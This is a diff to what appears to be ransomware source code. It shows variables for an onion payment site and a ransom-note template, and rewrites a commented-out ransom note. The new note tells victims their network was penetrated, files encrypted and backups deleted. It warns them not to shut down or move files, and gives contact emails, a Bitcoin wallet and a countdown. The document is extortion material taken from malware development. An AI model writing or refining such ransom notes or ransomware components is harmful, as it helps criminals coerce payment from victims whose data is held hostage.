@@ -508,14 +508,32 @@ wchar_t szwOnionSite[1024*2] = L"http://onion.onion";
 wchar_t szwStrNoteFormat[1024 * 4] = { L'D', L'E', L'A', L'D', L'T', L'E', L'X', L'T', 0 };
 
 /*
-LPCWSTR noteStrFormat = L"Hello dear user.\r\n"
-"Your files have been encrypted.\r\n\r\n"
-"-- What does it mean?!\r\n"
-"Content of your files have been modified. Without special key you can't undo that operation.\r\n\r\n"
+ Your network has been penetrated.
 
-"-- How to get special key?\r\n"
-"If you want to get it, you must pay us some money and we will help you.\r\n"
-"We will give you special decryption program and instructions.\r\n\r\n"
+All files on each host in the network have been encrypted with a strong algorithm.
+
+Backups were either encrypted or deleted or backup disks were formatted.
+Shadow copies also removed, so F8 or any other methods may damage encrypted data but not recover.
+
+We exclusively have decryption software for your situation
+No decryption software is available in the public.
+
+DO NOT RESET OR SHUTDOWN - files may be damaged.
+DO NOT RENAME OR MOVE the encrypted and readme files.
+DO NOT DELETE readme files.
+This may lead to the impossibility of recovery of the certain files.
+
+To get info (decrypt your files) contact us at
+TML@protonmail.com or todd@tmouserlaw.com
+
+BTC wallet:
+14hVKm7Ft2rxDBFTNkkRC3kGstMGp2A4hk
+
+NSFW
+
+No system is safe
+
+Countdown timer (.lnk): 28 days 12 hrs 42 mins
 */
 
 
